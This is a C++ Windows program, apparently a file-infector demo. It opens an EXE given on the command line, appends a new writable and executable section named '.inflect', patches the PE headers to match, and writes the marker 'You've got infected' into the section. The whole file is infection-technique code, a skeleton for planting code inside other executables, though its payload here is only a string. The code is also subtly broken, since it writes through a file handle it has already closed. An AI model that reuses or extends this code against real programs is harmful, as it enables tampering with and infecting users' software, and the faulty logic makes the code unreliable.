#include <stdio.h>
#include <windows.h>
#include <iostream>

using namespace std;

DWORD align(DWORD size, DWORD align, DWORD address) {
    if (!(size % align))
        return address + size;
    return address + (size / align + 1) * align;
}

bool AddSection(HANDLE &hFile, PIMAGE_DOS_HEADER pDosHeader, BYTE* pByte, DWORD fileSize, DWORD dword, DWORD sizeOfSection) {
    PIMAGE_FILE_HEADER pFileHeaders = (PIMAGE_FILE_HEADER)(pByte + pDosHeader->e_lfanew + sizeof(DWORD));
    PIMAGE_OPTIONAL_HEADER pOptionalHeaders = (PIMAGE_OPTIONAL_HEADER)(pByte + pDosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
    PIMAGE_SECTION_HEADER pSectionHeaders = (PIMAGE_SECTION_HEADER)(pByte + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    const char sectionName[] = ".inflect";

    ZeroMemory(&pSectionHeaders[pFileHeaders->NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&pSectionHeaders[pFileHeaders->NumberOfSections].Name, sectionName, 8);
    // Using 8 bytes for section name, cause it is the maximum allowed section name size

    // Insert all the required information about our new PE section
    pSectionHeaders[pFileHeaders->NumberOfSections].Misc.VirtualSize = align(sizeOfSection, pOptionalHeaders->SectionAlignment, 0);
    pSectionHeaders[pFileHeaders->NumberOfSections].VirtualAddress = align(pSectionHeaders[pFileHeaders->NumberOfSections - 1].Misc.VirtualSize, pOptionalHeaders->SectionAlignment, pSectionHeaders[pFileHeaders->NumberOfSections - 1].VirtualAddress);
    pSectionHeaders[pFileHeaders->NumberOfSections].SizeOfRawData = align(sizeOfSection, pOptionalHeaders->FileAlignment, 0);
    pSectionHeaders[pFileHeaders->NumberOfSections].PointerToRawData = align(pSectionHeaders[pFileHeaders->NumberOfSections - 1].SizeOfRawData, pOptionalHeaders->FileAlignment, pSectionHeaders[pFileHeaders->NumberOfSections - 1].PointerToRawData);
    pSectionHeaders[pFileHeaders->NumberOfSections].Characteristics = 0xE00000E0;
    /*
        0xE00000E0 = IMAGE_SCN_MEM_WRITE |
                    IMAGE_SCN_CNT_CODE  |
                    IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
                    IMAGE_SCN_MEM_EXECUTE |
                    IMAGE_SCN_CNT_INITIALIZED_DATA |
                    IMAGE_SCN_MEM_READ
    */
    SetFilePointer(hFile, pSectionHeaders[pFileHeaders->NumberOfSections].PointerToRawData + pSectionHeaders[pFileHeaders->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
    // End the file right here, on the last section + it's own size
    SetEndOfFile(hFile);
    // Changing the size of the image,to correspond to our modifications
    // By adding a new section,the image size is bigger now
    pOptionalHeaders->SizeOfImage = pSectionHeaders[pFileHeaders->NumberOfSections].VirtualAddress + pSectionHeaders[pFileHeaders->NumberOfSections].Misc.VirtualSize;
    // After a new section is added, changing the number of section    
    pFileHeaders->NumberOfSections += 1;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    // Adding all the modifications to the file
    WriteFile(hFile, pByte, fileSize, &dword, NULL);
    CloseHandle(hFile);
    return true;
}

bool AddCode(HANDLE hFile, PIMAGE_NT_HEADERS pNtHeaders, DWORD dword) {
    // A new section must be the last section added,cause of the code inside
    // AddSection function, getting to the last section to insert message
    PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(pNtHeaders);
    PIMAGE_SECTION_HEADER last = first + (pNtHeaders->FileHeader.NumberOfSections - 1);

    SetFilePointer(hFile, last->PointerToRawData, NULL, FILE_BEGIN);
    const char message[] = "You've got infected";
    WriteFile(hFile, message, strlen(message), &dword, 0);
    CloseHandle(hFile);
    return true;
}

int main(int argc, char* argv[])
{
    if (argc != 2) {
        cout << "Usage: " << argv[0] << " <path-of-EXE-file>" << endl;
        return 1;
    }

    // Open file and get information
    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        // handle error
        cout << "Error: Invalid file, try another one" << endl;
        return 0;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* pByte = new BYTE[fileSize];
    DWORD dword;

    if (!ReadFile(hFile, pByte, fileSize, &dword, NULL))
    {
        cout << "Error: can not open file" << endl;
        return 0;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return 0; //invalid PE

    if (AddSection(hFile, pDosHeader, pByte, fileSize, dword, 400)) {
        cout << "Progress: 50% (Section added)" << endl;
        //Lets insert data into the last section
        if (AddCode(hFile, pNtHeaders, dword)) {
            cout << "Progress: 100% (Code written)" << endl;
        }
        else {
            cout << "Error: Fail writting code" << endl;
            return 0;
        }     
    }
    else {
        cout << "Error: Fail adding section" << endl;
        return 0;
    }
        
    return 0;
}